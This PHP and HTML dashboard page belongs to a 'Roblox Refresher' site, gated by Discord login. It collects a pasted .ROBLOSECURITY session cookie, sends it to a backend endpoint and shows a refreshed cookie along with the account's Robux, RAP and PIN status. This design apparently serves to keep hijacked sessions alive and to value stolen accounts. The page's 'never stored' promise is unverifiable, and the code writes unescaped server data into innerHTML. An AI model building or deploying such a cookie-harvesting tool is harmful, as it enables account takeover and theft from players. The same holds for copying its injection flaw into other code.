<?php
// Start session with long lifetime (30 days)
ini_set('session.gc_maxlifetime', 2592000);
session_set_cookie_params(2592000);
session_start();

if (!isset($_SESSION['discord_user'])) {
    header('Location: login.php');
    exit;
}

$user = $_SESSION['discord_user'];
$avatarUrl = $user['avatar'] 
    ? "https://cdn.discordapp.com/avatars/{$user['id']}/{$user['avatar']}.png?size=128"
    : "https://cdn.discordapp.com/embed/avatars/0.png";
$username = htmlspecialchars($user['username']);
$discriminator = $user['discriminator'] ?? '0';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Dashboard - Roblox Refresher</title>

  <style>
    :root{
      --bg0:#070A12; --bg1:#050712;
      --text:rgba(255,255,255,.92); --muted:rgba(255,255,255,.62);
      --card:rgba(255,255,255,.06); --card2:rgba(255,255,255,.045); --stroke:rgba(140,190,255,.14);
      --accent:#7CB6FF; --accent2:#A8CEFF;
      --shadow:0 26px 80px rgba(0,0,0,.62); --radius:18px;
      --good:#29c27f; --bad:#f05555; --unk:#7a8399;
    }
    *{box-sizing:border-box}
    html,body{min-height:100%}
    body{
      margin:0; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; color:var(--text);
      background:
        radial-gradient(900px 520px at 50% 26%, rgba(124,182,255,.10), transparent 60%),
        radial-gradient(700px 420px at 50% 42%, rgba(124,182,255,.06), transparent 58%),
        linear-gradient(180deg, var(--bg0), var(--bg1));
      padding:20px 16px 40px;
    }
    .container{max-width:900px; margin:0 auto}
    
    /* Navbar */
    .navbar{
      background:linear-gradient(180deg,var(--card),var(--card2));
      border:1px solid var(--stroke); border-radius:var(--radius);
      padding:16px 24px; display:flex; justify-content:space-between; align-items:center;
      box-shadow:var(--shadow); margin-bottom:24px; backdrop-filter:blur(10px);
    }
    .nav-brand{display:flex;align-items:center;gap:12px}
    .nav-logo{
      width:42px;height:42px;border-radius:12px;display:grid;place-items:center;
      background:rgba(255,255,255,.05);border:1px solid rgba(140,190,255,.18);
    }
    .nav-logo svg{width:18px;height:18px;color:var(--accent)}
    .nav-title{margin:0;font-size:18px;font-weight:600;letter-spacing:-.01em}
    
    .user-info{display:flex;align-items:center;gap:12px}
    .user-avatar{width:42px;height:42px;border-radius:50%;border:2px solid var(--accent);object-fit:cover}
    .user-name{font-size:14px;font-weight:600;color:var(--text);display:none}

    /* Main Card */
    .card{
      width:100%; border-radius:var(--radius);
      border:1px solid var(--stroke); background:linear-gradient(180deg,var(--card),var(--card2));
      box-shadow:var(--shadow); padding:28px; position:relative; overflow:hidden;
      backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px);
    }
    .card::before{
      content:"";position:absolute;inset:-2px;
      background:radial-gradient(520px 180px at 40% 0%, rgba(124,182,255,.12), transparent 60%);
      opacity:.55;pointer-events:none
    }
    .card-content{position:relative;z-index:1}

    .card-header{margin-bottom:24px}
    .card-title{margin:0 0 6px;font-size:24px;font-weight:600;color:var(--text)}
    .card-desc{margin:0;font-size:14px;color:var(--muted);line-height:1.5}

    /* Form */
    .form-group{margin-bottom:20px}
    .label{margin:0 0 10px;font-size:13px;font-weight:500;color:rgba(255,255,255,.70);display:block}
    .input{
      width:100%;height:52px;border-radius:12px;border:1px solid rgba(255,255,255,.10);
      background:rgba(0,0,0,.22);color:var(--text);padding:0 16px;outline:none;font-size:14px;
      transition:all .2s ease;
    }
    .input::placeholder{color:rgba(255,255,255,.34)}
    .input:focus{border-color:rgba(124,182,255,.35);background:rgba(0,0,0,.3)}

    .btn{
      width:100%;height:54px;border-radius:14px;border:1px solid rgba(124,182,255,.26);
      background:linear-gradient(135deg, rgba(124,182,255,.25), rgba(124,182,255,.15));
      color:var(--text);font-weight:600;font-size:15px;cursor:pointer;
      display:flex;align-items:center;justify-content:center;gap:10px;
      box-shadow:0 16px 40px rgba(0,0,0,.38); transition:all .2s ease;
    }
    .btn:hover{
      background:linear-gradient(135deg, rgba(124,182,255,.35), rgba(124,182,255,.25));
      border-color:rgba(124,182,255,.4); transform:translateY(-2px);
      box-shadow:0 20px 48px rgba(0,0,0,.48);
    }
    .btn:active{transform:translateY(0)}
    .btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
    .btn svg{width:18px;height:18px}

    /* Modal */
    .modal{position:fixed;inset:0;display:none;z-index:1000}
    .modal[aria-hidden="false"]{display:block}
    .modal-backdrop{position:absolute;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px)}
    .modal-box{
      position:relative;max-width:720px;max-height:90vh;overflow-y:auto;margin:5vh auto 0;
      background:linear-gradient(180deg,var(--card),var(--card2));
      border:1px solid var(--stroke);border-radius:16px;box-shadow:var(--shadow);padding:28px;
    }
    .modal-title{margin:0 0 20px;color:var(--accent2);font-weight:600;font-size:22px;text-align:center}
    .modal-body{color:var(--text);font-size:14px;line-height:1.5}
    
    .info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-bottom:24px}
    .info-item{background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:14px}
    .info-label{font-size:11px;text-transform:uppercase;letter-spacing:.6px;color:var(--muted);margin-bottom:8px;font-weight:500}
    .info-value{font-size:16px;font-weight:600;color:var(--text)}
    
    .cookie-section{background:rgba(0,0,0,.4);border:1px solid var(--stroke);border-radius:12px;padding:18px;margin-top:24px}
    .cookie-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
    .cookie-header h4{margin:0;font-size:15px;color:var(--accent2);font-weight:600}
    .copy-btn{
      height:34px;padding:0 16px;border-radius:8px;border:1px solid rgba(124,182,255,.3);
      background:rgba(124,182,255,.12);color:var(--accent2);cursor:pointer;font-size:13px;font-weight:600;
      transition:all .2s ease;
    }
    .copy-btn:hover{background:rgba(124,182,255,.2);border-color:rgba(124,182,255,.5)}
    .copy-btn:active{transform:scale(.96)}
    .cookie-text{
      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
      font-size:12px;line-height:1.6;color:#d4e6ff;word-break:break-all;max-height:140px;overflow-y:auto;
      padding:12px;background:rgba(0,0,0,.5);border-radius:10px;
    }
    
    .modal-ok{
      margin-top:24px;width:100%;height:48px;border-radius:12px;border:1px solid rgba(124,182,255,.3);
      background:rgba(10,14,24,.8);color:var(--text);font-weight:600;cursor:pointer;font-size:14px;
      transition:all .2s ease;
    }
    .modal-ok:hover{background:rgba(20,28,50,.9);border-color:rgba(124,182,255,.5)}

    .footer{margin-top:28px;text-align:center;font-size:13px;color:var(--muted)}
    .footer span{color:var(--accent2);font-weight:500}

    @media (min-width: 640px) {
      .user-name{display:block}
    }
    @media (max-width: 640px) {
      .navbar{padding:14px 16px}
      .nav-title{font-size:16px}
      .card{padding:20px}
      .card-title{font-size:20px}
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Navbar -->
    <nav class="navbar">
      <div class="nav-brand">
        <div class="nav-logo" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6" />
          </svg>
        </div>
        <h1 class="nav-title">Roblox Refresher</h1>
      </div>
      
      <div class="user-info">
        <span class="user-name"><?php echo $username; ?></span>
        <img src="<?php echo htmlspecialchars($avatarUrl); ?>" alt="Avatar" class="user-avatar" />
      </div>
    </nav>

    <!-- Main Card -->
    <section class="card">
      <div class="card-content">
        <header class="card-header">
          <h2 class="card-title">Cookie Refresher</h2>
          <p class="card-desc">Paste your .ROBLOSECURITY cookie below to refresh it and view your account details</p>
        </header>

        <form id="refreshForm" onsubmit="return false;">
          <div class="form-group">
            <label class="label" for="cookieInput">.ROBLOSECURITY Cookie</label>
            <input 
              class="input" 
              id="cookieInput" 
              name="cookie" 
              type="text" 
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." 
              autocomplete="off"
              required
            />
          </div>

          <button class="btn" type="button" id="refreshButton">
            <svg viewBox="0 0 20 20" fill="currentColor">
              <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
            </svg>
            Refresh Cookie
          </button>
        </form>
      </div>
    </section>

    <p class="footer"><span>Tip:</span> Your cookie is processed securely and never stored permanently</p>
  </div>

  <!-- Result modal -->
  <div class="modal" id="modal" aria-hidden="true">
    <div class="modal-backdrop" id="modalBackdrop"></div>
    <div class="modal-box" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <h3 class="modal-title" id="modalTitle">Processing...</h3>
      <div class="modal-body" id="modalBody"></div>
      <button class="modal-ok" id="modalOk">Close</button>
    </div>
  </div>

  <script>
    function showModal(title, htmlBody) {
      const modal = document.getElementById('modal');
      const t = document.getElementById('modalTitle');
      const b = document.getElementById('modalBody');

      t.textContent = title || 'Message';
      b.innerHTML = htmlBody || '';
      modal.setAttribute('aria-hidden', 'false');

      const ok = document.getElementById('modalOk');
      const backdrop = document.getElementById('modalBackdrop');
      function close() {
        modal.setAttribute('aria-hidden', 'true');
        ok.removeEventListener('click', close);
        backdrop.removeEventListener('click', close);
      }
      ok.addEventListener('click', close);
      backdrop.addEventListener('click', close);
    }

    function formatAccountInfo(responseData) {
      const cookie = responseData.cookie || 'N/A';
      const userData = responseData.userData || {};
      
      const username = userData.username || '—';
      const userId = userData.userId || '—';
      const robux = userData.robux !== undefined ? userData.robux.toLocaleString() : '—';
      const pendingRobux = userData.pendingRobux !== undefined ? userData.pendingRobux.toLocaleString() : '—';
      const rap = userData.rap !== undefined ? userData.rap.toLocaleString() : '—';
      const summary = userData.summary !== undefined ? userData.summary.toLocaleString() : '—';
      const pin = userData.pin || '❓ Unknown';
      const premium = userData.premium || '❓ Unknown';
      const voiceChat = userData.voiceChat || '❓ Unknown';
      const accountAge = userData.accountAge || '—';
      const friends = userData.friends !== undefined ? userData.friends.toLocaleString() : '—';
      const followers = userData.followers !== undefined ? userData.followers.toLocaleString() : '—';
      
      return `
        <div class="info-grid">
          <div class="info-item">
            <div class="info-label">Username</div>
            <div class="info-value">${username}</div>
          </div>
          <div class="info-item">
            <div class="info-label">User ID</div>
            <div class="info-value">${userId}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Robux</div>
            <div class="info-value">R$ ${robux}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Pending Robux</div>
            <div class="info-value">R$ ${pendingRobux}</div>
          </div>
          <div class="info-item">
            <div class="info-label">RAP</div>
            <div class="info-value">R$ ${rap}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Summary</div>
            <div class="info-value">R$ ${summary}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Premium</div>
            <div class="info-value">${premium}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Voice Chat</div>
            <div class="info-value">${voiceChat}</div>
          </div>
          <div class="info-item">
            <div class="info-label">PIN Enabled</div>
            <div class="info-value">${pin}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Account Age</div>
            <div class="info-value">${accountAge}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Friends</div>
            <div class="info-value">${friends}</div>
          </div>
          <div class="info-item">
            <div class="info-label">Followers</div>
            <div class="info-value">${followers}</div>
          </div>
        </div>
        
        <div class="cookie-section">
          <div class="cookie-header">
            <h4>New Cookie</h4>
            <button class="copy-btn" onclick="copyToClipboard(\`${cookie}\`, this)">Copy</button>
          </div>
          <div class="cookie-text">${cookie}</div>
        </div>
      `;
    }

    function copyToClipboard(text, btn) {
      navigator.clipboard.writeText(text).then(() => {
        const orig = btn.textContent;
        btn.textContent = 'Copied!';
        setTimeout(() => btn.textContent = orig, 2000);
      }).catch(err => {
        alert('Failed to copy: ' + err);
      });
    }

    function initUI() {
      const btn = document.getElementById('refreshButton');
      const input = document.getElementById('cookieInput');

      if (!btn || !input) {
        console.error('UI elements not found.');
        return;
      }

      btn.addEventListener('click', async () => {
        const value = (input.value || '').trim();
        if (!value || value.length < 40) {
          showModal('Invalid Cookie', '<p style="text-align:center;color:var(--muted)">Please paste a valid .ROBLOSECURITY cookie (minimum 40 characters).</p>');
          return;
        }

        btn.disabled = true;
        btn.textContent = 'Refreshing...';
        
        showModal('Refreshing Cookie...', '<p style="text-align:center;color:var(--muted)">Please wait while we refresh your cookie and fetch account details...</p>');

        try {
          const res = await fetch('../api/refresh.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'cookie=' + encodeURIComponent(value)
          });
          
          const data = await res.json();

          if (!res.ok || data.error) {
            showModal('Error', `<p style="text-align:center;color:var(--bad)">${data.error || 'Request failed'}</p>`);
            return;
          }

          showModal('Cookie Refreshed Successfully! 🎉', formatAccountInfo(data));
        } catch (err) {
          showModal('Network Error', `<p style="text-align:center;color:var(--bad)">${err.message}</p>`);
        } finally {
          btn.disabled = false;
          btn.innerHTML = `
            <svg viewBox="0 0 20 20" fill="currentColor" style="width:18px;height:18px">
              <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/>
            </svg>
            Refresh Cookie
          `;
        }
      });
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initUI, { once:true });
    } else {
      initUI();
    }
  </script>
</body>
</html>
